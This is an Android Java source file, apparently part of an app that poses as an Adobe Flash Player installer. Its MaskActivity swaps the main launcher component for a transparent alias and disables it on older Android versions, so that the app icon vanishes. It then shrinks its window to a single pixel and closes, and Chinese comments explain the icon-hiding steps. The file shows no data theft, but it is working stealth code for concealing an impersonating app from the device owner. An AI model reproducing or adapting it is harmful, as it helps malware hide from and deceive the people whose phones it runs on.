package com.adobe.flashplayer.install;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;


public class MaskActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // 先禁用AliasMainActivity组件，启用alias组件
        set(MaskActivity.this, InstallActivity.class.getName(), "com.adobe.flashplayer.core.MaskAliasActivity");
        // 10.0以下禁用alias后，透明图标就不存在了，10.0的必须开启，不然会显示主应用图标，10.0会有一个透明的占位图
        if (Build.VERSION.SDK_INT < 29) {
            disableComponent(MaskActivity.this,"com.adobe.flashplayer.core.MaskAliasActivity");
        }
        Window window = getWindow();

        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }



        public static void set(Context context, String main, String alias) {
            disableComponent(context, main);
            enableComponent(context, alias);
        }


        public static void enableComponent(Context context, String clazzName) {
            ComponentName componentName =  new ComponentName(context, clazzName);
            PackageManager mPackageManager = context.getPackageManager();
            mPackageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        }


        public static void disableComponent(Context context, String clazzName) {
            ComponentName componentName =  new ComponentName(context, clazzName);
            PackageManager mPackageManager = context.getPackageManager();
            mPackageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }



}
